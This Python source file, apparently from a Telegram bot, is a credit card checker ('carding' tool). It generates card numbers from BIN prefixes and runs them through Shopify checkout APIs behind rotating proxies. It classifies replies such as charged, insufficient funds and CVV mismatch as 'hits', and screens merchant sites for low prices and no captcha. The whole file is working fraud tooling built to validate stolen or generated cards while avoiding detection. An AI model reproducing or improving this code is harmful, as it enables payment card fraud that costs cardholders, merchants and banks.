def generate_cc(bin_prefix, count=10):
    pattern = f"{bin_prefix}{'x' * (16 - len(bin_prefix))}|12|30|123"
    return generate_custom_cc(pattern, count)

_proxy_sems: Dict[str, asyncio.Semaphore] = {}
_proxy_fail_streak: Dict[str, int] = defaultdict(int)
_dead_proxies_run: set = set()
_rotation_counters: Dict[int, int] = {}
_rotation_lock = threading.Lock()

def rotate_proxy(uid: int, proxies: List[str]) -> Optional[str]:
    if not proxies: return None
    with _rotation_lock:
        i = _rotation_counters.get(uid, 0)
        _rotation_counters[uid] = i + 1
    return proxies[i % len(proxies)]

def proxy_sem(proxy: str) -> asyncio.Semaphore:
    if proxy not in _proxy_sems: _proxy_sems[proxy] = asyncio.Semaphore(PER_PROXY_CONCURRENCY)
    return _proxy_sems[proxy]

def mark_proxy_ok(proxy: str):
    if proxy: _proxy_fail_streak.pop(proxy, None)

def mark_proxy_fail(proxy: str) -> bool:
    if not proxy: return False
    _proxy_fail_streak[proxy] += 1
    if _proxy_fail_streak[proxy] >= PROXY_FAIL_THRESHOLD:
        _dead_proxies_run.add(proxy)
        return True
    return False

def normalize_proxy(line: str) -> Optional[str]:
    if not line: return None
    p = line.strip()
    if not p or p.startswith("#") or p.startswith("//"): return None
    scheme = "http"
    if p.startswith("socks5://"): scheme = "socks5"; p = p[9:]
    elif p.startswith("socks4://"): scheme = "socks4"; p = p[9:]
    elif p.startswith("http://"): scheme = "http"; p = p[7:]
    elif p.startswith("https://"): scheme = "https"; p = p[8:]
    if "@" in p:
        auth, hostport = p.split("@", 1)
        if ":" not in auth or ":" not in hostport: return None
        user, pw = auth.split(":", 1)
        host, port = hostport.rsplit(":", 1)
        return f"{scheme}://{user}:{pw}@{host}:{port}"
    parts = p.split(":")
    if len(parts) == 4: return f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"{scheme}://{parts[0]}:{parts[1]}"
    return None

def _proxy_to_url(p: str) -> str:
    if "://" in p: return p
    parts = p.split(":")
    return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}" if len(parts) == 4 else f"http://{p}"

def user_proxy_list(uid):
    with db() as c: return [r["proxy"] for r in c.execute("SELECT proxy FROM user_proxies WHERE uid=? AND status='live' ORDER BY id", (uid,)).fetchall()]

def user_proxy_all(uid):
    with db() as c: return c.execute("SELECT * FROM user_proxies WHERE uid=? ORDER BY id DESC", (uid,)).fetchall()

def clear_user_proxies(uid):
    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=?", (uid,))

def remove_user_proxy(uid: int, proxy: str):
    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, proxy))

def proxy_display(proxy: str) -> str:
    if "@" in proxy and "://" in proxy:
        try:
            scheme, rest = proxy.split("://", 1)
            if "@" in rest: return f"{scheme}://***:***@{rest.rsplit('@', 1)[1]}"
        except: pass
    return proxy[:60]

async def check_proxy_live(proxy: str) -> Dict[str, Any]:
    start = time.time()
    proxy_url = _proxy_to_url(proxy)
    try:
        is_socks = proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
        if is_socks:
            if not HAS_SOCKS: return {"ok": False, "latency": 0, "error": "aiohttp_socks missing"}
            connector = ProxyConnector.from_url(proxy_url)
        else:
            connector = aiohttp.TCPConnector(force_close=True, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(PROXY_TEST_URL, proxy=None if is_socks else proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT)) as r:
                if r.status == 200:
                    txt = await r.text(errors="ignore")
                    if txt and any(c.isdigit() for c in txt): return {"ok": True, "latency": round(time.time() - start, 2)}
                    return {"ok": False, "latency": round(time.time() - start, 2), "error": "bad body"}
                return {"ok": False, "latency": round(time.time() - start, 2), "error": f"HTTP {r.status}"}
    except asyncio.TimeoutError: return {"ok": False, "latency": round(time.time() - start, 2), "error": "Timeout"}
    except Exception as e: return {"ok": False, "latency": round(time.time() - start, 2), "error": _sanitize_err(str(e)[:80])}

async def check_proxy_hq(proxy: str) -> Dict[str, Any]:
    r = await check_proxy_live(proxy)
    return {"ok": r.get("ok"), "latency": r.get("latency", 0), "error": r.get("error", "")}

def parse_proxy_txt(raw: str) -> List[str]:
    if not raw: return []
    out, seen = [], set()
    for t in re.split(r"[\r\n,;\t]+", raw):
        t = t.strip()
        if len(t) < 6: continue
        n = normalize_proxy(t)
        if n and n not in seen: seen.add(n); out.append(n)
    return out

async def preflight_proxies(uid: int, proxies: List[str]) -> Dict[str, Any]:
    result = {"tested": 0, "live": [], "dead": [], "total": len(proxies), "latencies": {}}
    if not proxies: return result
    sem, lock = asyncio.Semaphore(PROXY_TEST_BATCH), asyncio.Lock()
    async def one(p: str):
        async with sem:
            res = await check_proxy_hq(p)
            async with lock:
                result["tested"] += 1
                if res.get("ok"): result["live"].append(p); result["latencies"][p] = res.get("latency", 0)
                else: result["dead"].append(p)
    await asyncio.gather(*(one(p) for p in proxies))
    if result["dead"]:
        with db() as c:
            for p in result["dead"]: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, p))
    if result["live"]:
        now = datetime.now(timezone.utc).isoformat()
        with db() as c:
            for p in result["live"]: c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?", (result["latencies"].get(p, 0), now, uid, p))
    return result

async def add_proxies_bulk(uid: int, proxies: List[str]) -> Dict[str, Any]:
    result = {"added": 0, "live": 0, "dead": 0, "rejected": 0, "limit_hit": False, "total_parsed": len(proxies)}
    with db() as c: existing = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (uid,)).fetchone()["n"]
    if existing >= LIVE_PROXY_LIMIT: result["limit_hit"] = True; return result
    slots = LIVE_PROXY_LIMIT - existing
    new_proxies, seen_set = [], set()
    with db() as c: existing_set = {r["proxy"] for r in c.execute("SELECT proxy FROM user_proxies WHERE uid=?", (uid,)).fetchall()}
    for p in proxies:
        if len(new_proxies) >= slots: break
        if p in existing_set or p in seen_set: result["rejected"] += 1; continue
        new_proxies.append(p); seen_set.add(p)
    if not new_proxies: return result
    with db() as c:
        for p in new_proxies: c.execute("INSERT OR IGNORE INTO user_proxies(uid, proxy, status) VALUES (?, ?, 'unknown')", (uid, p))
    result["added"] = len(new_proxies)
    sem, results = asyncio.Semaphore(PROXY_TEST_BATCH), {}
    async def one(p):
        async with sem: results[p] = await check_proxy_hq(p)
    await asyncio.gather(*(one(p) for p in new_proxies))
    live_found, dead_found, to_delete = 0, 0, []
    now = datetime.now(timezone.utc).isoformat()
    with db() as c: current_live = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=? AND status='live'", (uid,)).fetchone()["n"]
    for p in new_proxies:
        if results.get(p, {}).get("ok"):
            if current_live < LIVE_PROXY_LIMIT:
                current_live += 1; live_found += 1
                with db() as c: c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?", (results[p].get("latency", 0), now, uid, p))
            else: to_delete.append(p)
        else: dead_found += 1; to_delete.append(p)
    if to_delete:
        with db() as c:
            for p in to_delete: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, p))
    result["live"], result["dead"] = live_found, dead_found
    return result

async def lookup_bin(bin_number):
    try:
        with db() as c:
            row = c.execute("SELECT data FROM bin_cache WHERE bin=?", (bin_number[:6],)).fetchone()
            if row: return json.loads(row["data"])
    except: pass
    try:
        async def fetch():
            async with aiohttp.ClientSession() as sess:
                async with sess.get(f"https://data.handyapi.com/bin/{bin_number}", timeout=aiohttp.ClientTimeout(total=5)) as r:
                    if r.status == 200:
                        data = await r.json()
                        if data.get("Status") == "SUCCESS":
                            try:
                                async with _get_write_lock():
                                    with db() as c: c.execute("INSERT OR REPLACE INTO bin_cache(bin, data, ts) VALUES (?,?,?)", (bin_number[:6], json.dumps(data), datetime.now(timezone.utc).isoformat()))
                            except: pass
                            return data
                    return {"error": "BIN not found"}
        return await asyncio.wait_for(fetch(), timeout=6.0)
    except Exception: return {"error": "BIN API unreachable"}

CHARGED_KEYWORDS = ("ORDER_PLACED","ORDER_PAID","PAYMENT_SUCCESSFULL","PAYMENT_CAPTURED","PAYMENT_COMPLETED","PAYMENT_FULFILLED")
SITE_ERROR_KEYWORDS = ("NO_PRODUCTS", "PRODUCTS_NOT_FOUND", "PAYMENTS_ZONE_NOT_FOUND", "INVALID_SHOP","INVALID_PURCHASE_TYPE", "REQUIRED_ARTIFACTS_UNAVAILABLE", "SUBSCRIPTION_REQUIRED","SITE ERROR", "CART FAILED", "NO PRODUCT", "TIMEOUT", "THROTTLED","CAPTCHA_REQUIRED", "BOT_BLOCK", "HTTP 429", "HTTP 503", "HTTP 401", "HTTP 403","DELIVERY", "VAULT", "SESSION TOKEN", "CHECKOUT ERROR","OUT OF STOCK", "UNAVAILABLE", "MINIMUM", "SECURITY_VIOLATION","LOGIN REQUIRED", "SITE REQUIRES LOGIN","SITE_REQUIRED", "NO_SITE", "SITE_MISSING", "INVALID_SITE","APPLICATION NOT FOUND", "APP NOT FOUND", "404 NOT FOUND","INTERNAL SERVER ERROR", "BAD GATEWAY", "NOT FOUND")
NSF_KEYWORDS = ("INSUFFICIENT_FUNDS", "NSF", "INSUFFICIENT FUNDS")
CCN_KEYWORDS = ("INCORRECT_CVC", "INVALID_CVC", "CVV", "WRONG_CVV", "INCORRECT_ZIP")
THREE_DS_KEYWORDS = ("3DS", "3D_SECURE", "3D SECURE", "AUTHENTICATION_REQUIRED", "OTP_REQUIRED", "OTP")
DECLINE_KEYWORDS = ("DECLINED", "DECLINE","DO_NOT_HONOR", "DO_NOT_HONOUR", "DO NOT HONOR", "DO NOT HONOUR","GENERIC_DECLINE", "GENERIC DECLINE","INVALID_ACCOUNT", "INVALID ACCOUNT","INVALID_NUMBER", "INVALID NUMBER","INVALID_CARD", "INVALID CARD","INCORRECT_NUMBER", "INCORRECT NUMBER","CARD_NOT_ACTIVE", "CARD NOT ACTIVE","INACTIVE_CARD", "INACTIVE CARD","FRAUDULENT", "SUSPECTED_FRAUD", "FRAUD_SUSPECTED","STOLEN_CARD", "STOLEN CARD","LOST_CARD", "LOST CARD","PICKUP_CARD", "PICKUP CARD", "PICK_UP_CARD", "PICK UP CARD","CALL_ISSUER", "CALL ISSUER", "CONTACT_ISSUER", "CONTACT ISSUER","EXPIRED_CARD", "EXPIRED CARD", "CARD_EXPIRED", "CARD EXPIRED","RESTRICTED_CARD", "RESTRICTED CARD","CARD_NOT_SUPPORTED", "CARD NOT SUPPORTED","UNSUPPORTED_CARD", "UNSUPPORTED CARD","TRANSACTION_NOT_ALLOWED", "TRANSACTION NOT ALLOWED","NOT_PERMITTED", "NOT PERMITTED","NOT_ALLOWED", "NOT ALLOWED","BIN_BLOCKED", "BIN BLOCKED","BLOCKED_CARD", "BLOCKED CARD","AUTHENTICATION_FAILED", "AUTHENTICATION FAILED","AUTHORIZATION_FAILED", "AUTHORIZATION FAILED")
PROXY_ERROR_KEYWORDS = ("PROXY ERROR","CANNOT CONNECT","CONNECTION REFUSED","TUNNEL CONNECTION FAILED","407 PROXY AUTH","PROXY AUTH","PROXY DEAD","FAILED TO CONNECT","CONNECT CALL FAILED")
WORKING_SITE_CLASSES = ("declined", "charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds")

def _contains_any(upper_text: str, keywords) -> bool: return any(k in upper_text for k in keywords)

def parse_response(text: str, http_status: int = 200) -> Dict[str, Any]:
    raw_text   = text or ""
    full_upper = raw_text.upper()
    if http_status == 429 or "RATE LIMIT" in full_upper or "TOO MANY" in full_upper: return {"cls": "rate_limited", "response": "rate_limited", "raw": raw_text[:500], "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if http_status >= 500: return {"cls": "site_error", "response": f"HTTP {http_status}", "raw": raw_text[:500], "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    data = {}
    s = raw_text.strip()
    if s.startswith(("{", "[")):
        try:
            parsed = json.loads(s)
            if isinstance(parsed, list) and parsed and isinstance(parsed[0], dict): data = parsed[0]
            elif isinstance(parsed, dict): data = parsed
        except: pass
    charged_flag  = str(data.get("Charged",  "False")).strip().lower() == "true"
    approved_flag = str(data.get("Approved", "False")).strip().lower() == "true"
    resp_msg      = str(data.get("Response", data.get("response", data.get("message", data.get("error", "")))) or "").strip()
    gateway       = str(data.get("Gate", data.get("Gateway", data.get("gateway", "Shopify"))) or "Shopify").strip()
    check_time    = str(data.get("Time", data.get("time", "")) or "").strip()
    price_raw     = str(data.get("Price", data.get("price", data.get("amount", "0"))) or "0")
    amount, currency, pp = 0.0, "USD", price_raw.strip().split()
    if pp:
        try: amount = float(pp[0].replace("?","0").replace("$",""))
        except: pass
        if len(pp) > 1 and pp[1].isalpha(): currency = pp[1].upper()
    if not resp_msg: resp_msg = raw_text.strip()[:200] or "unknown"
    ru, fu = resp_msg.upper(), full_upper
    LIVE_RESPONSES = {"INSUFFICIENT_FUNDS", "NSF", "INSUFFICIENT FUNDS","INCORRECT_CVC", "INVALID_CVC", "WRONG_CVV", "INCORRECT_ZIP","OTP_REQUIRED", "AUTHENTICATION_REQUIRED","3DS", "3D_SECURE", "3D SECURE"}
    HARD_DECLINE = {"CARD_DECLINED", "DECLINED", "DECLINE","DO_NOT_HONOR", "DO_NOT_HONOUR", "DO NOT HONOR", "DO NOT HONOUR","GENERIC_DECLINE", "FRAUDULENT", "SUSPECTED_FRAUD","STOLEN_CARD", "LOST_CARD", "PICKUP_CARD", "PICK_UP_CARD","CALL_ISSUER", "CONTACT_ISSUER","EXPIRED_CARD", "CARD_EXPIRED","RESTRICTED_CARD", "CARD_NOT_SUPPORTED", "UNSUPPORTED_CARD","TRANSACTION_NOT_ALLOWED", "NOT_PERMITTED", "NOT_ALLOWED","BLOCKED_CARD", "BIN_BLOCKED","INVALID_ACCOUNT", "CARD_NOT_ACTIVE", "INACTIVE_CARD","INVALID_NUMBER", "INCORRECT_NUMBER", "INVALID_CARD","AUTHENTICATION_FAILED", "AUTHORIZATION_FAILED"}
    if charged_flag or _contains_any(ru, CHARGED_KEYWORDS): cls = "charged"
    elif _contains_any(fu, PROXY_ERROR_KEYWORDS): cls = "proxy_error"
    elif _contains_any(ru, SITE_ERROR_KEYWORDS): cls = "site_error"
    elif _contains_any(ru, THREE_DS_KEYWORDS): cls = "approved_3ds"
    elif _contains_any(ru, NSF_KEYWORDS): cls = "approved_nsf"
    elif _contains_any(ru, CCN_KEYWORDS): cls = "approved_ccn"
    elif any(k in ru for k in HARD_DECLINE): cls = "declined"
    elif _contains_any(ru, DECLINE_KEYWORDS): cls = "declined"
    elif approved_flag and any(k in ru for k in LIVE_RESPONSES): cls = "approved"
    else: cls = "declined"
    return {"cls": cls, "response": resp_msg[:200], "amount": amount, "currency": currency, "gateway": gateway, "check_time": check_time, "success": cls in ("charged","approved","approved_nsf","approved_ccn","approved_3ds"), "raw": raw_text[:500], "http": http_status}

def is_hit(cls): return cls in ("charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds")

_direct_http_session: Optional[aiohttp.ClientSession] = None
_proxy_http_session: Optional[aiohttp.ClientSession] = None
def direct_session() -> aiohttp.ClientSession:
    global _direct_http_session
    if _direct_http_session is None or _direct_http_session.closed:
        _direct_http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=5000, limit_per_host=5000, ttl_dns_cache=300, enable_cleanup_closed=True, ssl=False), timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=PROXY_CONNECT_TIMEOUT, sock_read=PROXY_SOCK_READ_TIMEOUT))
    return _direct_http_session
def proxy_client_session() -> aiohttp.ClientSession:
    global _proxy_http_session
    if _proxy_http_session is None or _proxy_http_session.closed:
        _proxy_http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=5000, limit_per_host=5000, force_close=True, ttl_dns_cache=300, enable_cleanup_closed=True, ssl=False), timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=PROXY_CONNECT_TIMEOUT, sock_read=PROXY_SOCK_READ_TIMEOUT))
    return _proxy_http_session
def _proxy_exc(e): return any(k in str(e).upper() for k in ("PROXY","TUNNEL","407","CANNOT CONNECT","CONNECTION REFUSED","CONNECT CALL FAILED"))
def _build_api_request(ep: Dict[str, Any], cc: str, proxy: Optional[str], site: Optional[str]):
    api_site = site if not site or site.startswith("http") else f"https://{site}"
    if ep.get("style", "params") == "raw":
        base, sep = ep["url"], "&" if "?" in ep["url"] else "?"
        parts = [urllib.parse.quote(cc, safe=""), f"proxy={urllib.parse.quote(proxy or '', safe=':@')}"]
        if api_site: parts.append(f"site={urllib.parse.quote(api_site, safe=':/')}")
        if ep.get("key"): parts.append(f"key={urllib.parse.quote(str(ep['key']), safe='')}")
        return f"{base}{sep}{'&'.join(parts)}", None
    params = [("cc", cc), ("proxy", proxy or "")]
    if api_site: params.append(("site", api_site))
    if ep.get("key"): params.append(("key", str(ep["key"])))
    return ep["url"], params

async def _do_api_call(ep: Dict[str, Any], cc: str, proxy: Optional[str], site: Optional[str], uid: Optional[int], timeout: Optional[float]) -> Dict[str, Any]:
    url, params = _build_api_request(ep, cc, proxy, site)
    ep_url, ct = ep["url"], aiohttp.ClientTimeout(total=timeout or CHECK_TIMEOUT, connect=min(PROXY_CONNECT_TIMEOUT, timeout or CHECK_TIMEOUT), sock_read=min(PROXY_SOCK_READ_TIMEOUT, timeout or CHECK_TIMEOUT))
    proxy_url = _proxy_to_url(proxy) if proxy else None
    is_socks = proxy_url and proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
    try:
        if proxy:
            async with proxy_sem(proxy):
                if is_socks:
                    if not HAS_SOCKS: return {"cls": "error", "response": "aiohttp_socks required for SOCKS proxies", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
                    connector = ProxyConnector.from_url(proxy_url)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        async with session.get(url, params=params, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
                else:
                    async with proxy_client_session().get(url, params=params, proxy=proxy_url, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
            mark_proxy_ok(proxy)
        else:
            async with direct_session().get(url, params=params, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
        res = parse_response(text, status); res["response"] = _sanitize_err(res.get("response", ""))
        if res["cls"] == "site_error": mark_endpoint_fail(ep_url)
        else: mark_endpoint_ok(ep_url)
        if res["cls"] == "rate_limited": _bench_site(site or "", 180)
        elif res["cls"] == "proxy_error":
            dropped = mark_proxy_fail(proxy) if proxy else False
            if dropped and uid is not None and proxy: remove_user_proxy(uid, proxy)
            res["_dropped"] = dropped
        res.update({"_site": site or "", "_proxy": proxy, "_endpoint": ep_url, "_dropped": res.get("_dropped", False)})
        return res
    except asyncio.TimeoutError:
        mark_endpoint_fail(ep_url)
        dropped = mark_proxy_fail(proxy) if proxy else False
        if dropped and uid is not None and proxy: remove_user_proxy(uid, proxy)
        return {"cls": "timeout", "response": "timeout", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site or "", "_proxy": proxy, "_dropped": dropped, "_endpoint": ep_url}
    except Exception as e:
        is_proxy_err = _proxy_exc(e)
        dropped = False
        if proxy and is_proxy_err:
            dropped = mark_proxy_fail(proxy)
            if dropped and uid is not None: remove_user_proxy(uid, proxy)
        else: mark_endpoint_fail(ep_url)
        return {"cls": "proxy_error" if is_proxy_err else "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site or "", "_proxy": proxy, "_dropped": dropped, "_endpoint": ep_url}

async def call_stripe_api(cc: str, proxy: Optional[str] = None) -> dict:
    return {"cls": "declined", "response": "STRIPE_API_NOT_CONFIGURED", "amount": 0.0, "currency": "USD", "gateway": "Stripe", "check_time": ""}

async def call_api(cc: str, proxy: Optional[str] = None, site: Optional[str] = None, uid: Optional[int] = None, timeout: Optional[float] = None, mode: str = "shopify", single: bool = False) -> Dict[str, Any]:
    try:
        return await asyncio.wait_for(_call_api_raw(cc, proxy, site, uid, timeout, mode, single), timeout=timeout or 90.0)
    except asyncio.TimeoutError:
        return {"cls": "timeout", "response": "timeout (90s max)", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    except Exception as e:
        return {"cls": "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}

async def _call_api_raw(cc: str, proxy: Optional[str] = None, site: Optional[str] = None, uid: Optional[int] = None, timeout: Optional[float] = None, mode: str = "shopify", single: bool = False) -> Dict[str, Any]:
    if mode == "auth": return await call_stripe_api(cc, _proxy_to_url(proxy) if proxy else None)
    t = timeout or CHECK_TIMEOUT
    cur_mode = get_setting("site_mode", "auto")
    # --- Try new DB-backed API pools first ---
    if cur_mode in ("siteless", "auto"):
        sl_api = pick_siteless_api()
        if sl_api:
            url = build_siteless_url(sl_api, cc, proxy)
            res = await _call_new_api(url, proxy, uid, t)
            if res.get("cls") not in RETRYABLE_CLS: return res
            # retry with another siteless if available
            sl2 = pick_siteless_api()
            if sl2 and sl2["endpoint"] != sl_api["endpoint"]:
                url2 = build_siteless_url(sl2, cc, proxy)
                res2 = await _call_new_api(url2, proxy, uid, t)
                if res2.get("cls") not in RETRYABLE_CLS: return res2
    if cur_mode in ("with_site", "auto"):
        ws_api = pick_withsite_api()
        if ws_api:
            if not site:
                sl = _pick_random_sites(1); site = sl[0] if sl else ""
            if site:
                await acquire_site_slot(site)
                url = build_withsite_url(ws_api, cc, proxy, site)
                res = await _call_new_api(url, proxy, uid, t)
                if res.get("cls") not in RETRYABLE_CLS: return res
    # --- Fallback to old endpoint list ---
    eps = _filtered_endpoints()
    if not eps: return {"cls": "error", "response": f"no apis configured ({mode_label()})", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if single:
        ep = eps[0]
        need_site = ep.get("site_required", False)
        if need_site and not site:
            sl = _pick_random_sites(1); site = sl[0] if sl else ""
            if not site: return {"cls": "site_error", "response": "no sites available", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
        if site and need_site: await acquire_site_slot(site)
        return await _do_api_call(ep, cc, proxy, site if need_site else None, uid, timeout)
    healthy = [e for e in eps if not is_endpoint_down(e["url"])]
    pool = healthy if healthy else eps
    global _endpoint_rr
    with _endpoint_rr_lock:
        ep = pool[_endpoint_rr % len(pool)]
        _endpoint_rr += 1
    need_site = ep.get("site_required", False)
    if need_site and not site:
        sl = _pick_random_sites(1); site = sl[0] if sl else ""
        if not site: return {"cls": "site_error", "response": "no sites available", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if site and need_site: await acquire_site_slot(site)
    res = await _do_api_call(ep, cc, proxy, site if need_site else None, uid, timeout)
    if res["cls"] in RETRYABLE_CLS and not res.get("_dropped") and len(eps) > 1:
        others = [e for e in eps if e["url"] != ep["url"] and not is_endpoint_down(e["url"])]
        if others:
            fb_ep = others[0]; fb_need_site = fb_ep.get("site_required", False)
            res = await _do_api_call(fb_ep, cc, proxy, site if fb_need_site else None, uid, timeout)
    return res

async def test_site(site: str, timeout: Optional[float] = None) -> Dict[str, Any]:
    """Test a single site via the best available with-site API. Returns parsed response with amount/cls."""
    t = timeout or 20.0
    site_full = site if site.startswith("http") else f"https://{site}"
    ct = aiohttp.ClientTimeout(total=t, connect=PROXY_CONNECT_TIMEOUT, sock_read=t)

    async def _fetch(url: str) -> Dict[str, Any]:
        try:
            async with direct_session().get(url, timeout=ct) as r:
                text = await r.text(errors="ignore")
                res = parse_response(text, r.status)
                res["response"] = _sanitize_err(res.get("response", ""))
                res["_site"] = site
                return res
        except asyncio.TimeoutError:
            return {"cls": "timeout", "response": "timeout", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site}
        except Exception as e:
            return {"cls": "error", "response": _sanitize_err(str(e)[:100]), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site}

    # 1. Try new with-site API pool (round-robin)
    ws_api = pick_withsite_api()
    if ws_api:
        url = build_withsite_url(ws_api, DUMMY_CC, None, site_full)
        res = await _fetch(url)
        # Only discard if it's a network-level error — site_error/declined/charged are all valid answers
        if res.get("cls") not in ("error", "timeout"):
            return res
        # Try a second with-site endpoint if available
        ws2 = pick_withsite_api()
        if ws2 and ws2["endpoint"] != ws_api["endpoint"]:
            res2 = await _fetch(build_withsite_url(ws2, DUMMY_CC, None, site_full))
            if res2.get("cls") not in ("error", "timeout"):
                return res2

    # 2. Fallback to legacy site-required endpoints
    legacy = [ep for ep in load_api_state().get("endpoints", []) if ep.get("enabled", True) and ep.get("site_required", False)]
    if legacy:
        ep = legacy[0]
        url, params = _build_api_request(ep, DUMMY_CC, None, site_full)
        try:
            async with direct_session().get(url, params=params, timeout=ct) as r:
                res = parse_response(await r.text(errors="ignore"), r.status)
                res["response"] = _sanitize_err(res.get("response", ""))
                res["_site"] = site
                return res
        except asyncio.TimeoutError:
            return {"cls": "timeout", "response": "timeout", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site}
        except Exception as e:
            return {"cls": "error", "response": _sanitize_err(str(e)[:100]), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site}

    return {"cls": "site_error", "response": "no with-site API configured — add one in Admin → API Manager → With-Site APIs", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site}

async def check_sites_clean(sites: List[str], timeout: Optional[float] = None) -> Dict[str, Any]:
    result = {"total": len(sites), "clean": [], "dead": [], "captcha": []}
    sem, lock = asyncio.Semaphore(8), asyncio.Lock()
    async def one(site: str):
        async with sem:
            try: res = await test_site(site, timeout=timeout or 15)
            except Exception as e: res = {"cls": "error", "response": _sanitize_err(str(e)[:60])}
            async with lock:
                cls, amount = res.get("cls", "error"), res.get("amount", 0.0)
                if cls in WORKING_SITE_CLASSES: result["clean"].append({"site": site, "price": amount, "status": cls})
                elif cls == "captcha": result["captcha"].append({"site": site, "price": amount})
                else: result["dead"].append({"site": site, "reason": res.get("response", "")[:60]})
    await asyncio.gather(*(one(s) for s in sites))
    return result

async def bulk_add_sites(raw: str) -> Dict[str, Any]:
    """Test all sites via API. Sites with price ≤ max_price are saved. Returns detailed result."""
    raw_lines = [l.strip() for l in re.split(r"[\r\n,;]+", raw) if l.strip()]
    # Normalize — strip http/https, paths
    seen_sites, sites = set(), []
    for l in raw_lines:
        s = l.lower()
        s = s[8:] if s.startswith("https://") else s[7:] if s.startswith("http://") else s
        s = s.split("/")[0].strip()
        if s and s not in seen_sites: seen_sites.add(s); sites.append(s)

    max_p = float(get_setting("site_max_price", "6.0"))
    clean, upper, dead = [], [], []
    sem, lock = asyncio.Semaphore(10), asyncio.Lock()

    async def test_one(s: str):
        async with sem:
            res = await test_site(s, timeout=20)
            cls = res.get("cls", "error")
            amount = float(res.get("amount") or 0.0)
            resp = res.get("response", "")[:80]
            async with lock:
                is_captcha = "CAPTCHA" in resp.upper() or "PROPOSAL_ERROR" in resp.upper() or cls == "captcha"
                if cls in ("error", "timeout", "proxy_error"):
                    dead.append({"site": s, "reason": resp, "cls": cls})
                elif cls in ("site_error",):
                    # site_error from API means the site itself is dead/invalid
                    dead.append({"site": s, "reason": resp or "site_error", "cls": cls})
                elif is_captcha or amount > max_p:
                    upper.append({"site": s, "price": amount, "cls": cls, "resp": resp})
                elif cls in WORKING_SITE_CLASSES:
                    clean.append({"site": s, "price": amount, "cls": cls})
                    add_site_db(s)
                else:
                    dead.append({"site": s, "reason": resp, "cls": cls})

    await asyncio.gather(*(test_one(s) for s in sites))
    return {"clean": clean, "upper": upper, "dead": dead, "total": len(sites), "max_price": max_p}

def _bulk_sites_report(result: Dict[str, Any]) -> str:
    clean, upper, dead = result.get("clean", []), result.get("upper", []), result.get("dead", [])
    max_p = result.get("max_price", 6.0)
    lines = [
        f"{pe('check')} <b>{sc('Site Checker Complete')}</b>",
        f"<blockquote>{pe('shop')} {sc('Total Tested')}: <b>{result['total']}</b>\n"
        f"{pe('check')} {sc('Clean')} (saved): <b>{len(clean)}</b>\n"
        f"{pe('warn')} {sc('High Price')} (>${max_p:.0f} not saved): <b>{len(upper)}</b>\n"
        f"{pe('cross2')} {sc('Dead/Error')}: <b>{len(dead)}</b></blockquote>"
    ]
    if clean:
        lines.append(f"<blockquote><b>{pe('check')} {sc('Saved Sites')}:</b>")
        for s in clean[:12]: lines.append(f"  <code>{esc(s['site'])}</code> · <b>${s['price']:.2f}</b>")
        if len(clean) > 12: lines.append(f"  <i>...+{len(clean)-12} more (see file)</i>")
        lines.append("</blockquote>")
    if upper:
        lines.append(f"<blockquote><b>{pe('warn')} {sc('High Price Sites')} (not saved):</b>")
        for s in upper[:8]: lines.append(f"  <code>{esc(s['site'])}</code> · ${s['price']:.2f}")
        if len(upper) > 8: lines.append(f"  <i>...+{len(upper)-8} more (see file)</i>")
        lines.append("</blockquote>")
    return "\n".join(lines)

def _make_sites_txt(sites_list: list, label: str) -> bytes:
    """Generate a .txt file from a list of site dicts or strings."""
    lines = [f"# {label}", f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ""]
    for s in sites_list:
        if isinstance(s, dict): lines.append(f"{s.get('site', s)} | ${s.get('price', 0):.2f} | {s.get('cls', '')} | {s.get('resp', s.get('reason', ''))}"[:120])
        else: lines.append(str(s))
    return "\n".join(lines).encode("utf-8")

_bot_ref: Optional[Bot] = None
